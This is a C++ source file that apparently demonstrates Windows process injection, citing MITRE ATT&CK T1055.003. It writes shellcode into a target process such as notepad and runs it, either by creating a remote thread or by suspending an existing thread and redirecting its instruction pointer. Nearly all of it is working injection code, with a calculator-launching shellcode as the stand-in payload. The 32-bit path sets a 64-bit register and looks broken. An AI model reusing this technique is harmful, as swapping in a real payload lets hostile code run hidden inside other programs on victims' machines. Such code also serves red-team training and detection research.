#include <TlHelp32.h>
#include <windows.h>

#include <format>

#include "ulib.h"

#if _WIN64
static constexpr uint8_t g_shellcode[206] = ul::shellcodes::x64::pop_calc;
#else
static constexpr uint8_t g_shellcode[201] = ul::shellcodes::x86::pop_calc;
#endif

static auto inject_thread(DWORD const pid) -> bool
{
  auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  auto remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(g_shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(hProcess, remoteBuffer, g_shellcode, sizeof(g_shellcode), NULL);
  auto remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
  CloseHandle(hProcess);
  return true;
}

// https://attack.mitre.org/techniques/T1055/003/
static auto hijack_thread(std::string const& process_name) -> bool
{
  CONTEXT context;
  context.ContextFlags = CONTEXT_FULL;
  LPVOID shellcode_addr = NULL;
  auto found = ::ul::walk_threads_using_toolhelp(process_name, [&](::ul::Thread const& thread) -> ::ul::walk_t {
    if (!shellcode_addr) {
      ::ul::info("Inject shellcode into target process");
      auto process_handle = ::OpenProcess(PROCESS_ALL_ACCESS, 0, thread.process.pid);
      shellcode_addr = ::VirtualAllocEx(process_handle, NULL, sizeof(g_shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      WriteProcessMemory(process_handle, shellcode_addr, g_shellcode, sizeof(g_shellcode), NULL);
    }

    ::ul::info(std::format("Try to hijack first thread {}", thread.tid));
    auto hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, thread.tid);
    ::ul::info("Suspend thread");
    SuspendThread(hThread);
    ::ul::info("Hijack thread PC");
    GetThreadContext(hThread, &context);
    context.Rip = (DWORD_PTR)shellcode_addr;
    SetThreadContext(hThread, &context);
    ::ul::info("Resume thread");
    ResumeThread(hThread);

    return ::ul::walk_t::WALK_STOP;
  });

  if (!found) {
    ::ul::error("Process not found");
  }

  return found;
}

int main(int argc, char** argv)
{
  // Try with C:\Windows\system32\notepad.exe or C:\Windows\SysWOW64\notepad.exe
  auto process_name = std::string{argv[1]};
  (void)::ul::with_process_using_wts(process_name, [&](::ul::Process const& process) -> ::ul::walk_t {
    auto pid = process.pid;
    ::ul::info(std::format("Injecting to {} ({})", process_name, pid));
    // inject_thread(pid);
    hijack_thread(process_name);
    return ::ul::walk_t::WALK_STOP;
  });
}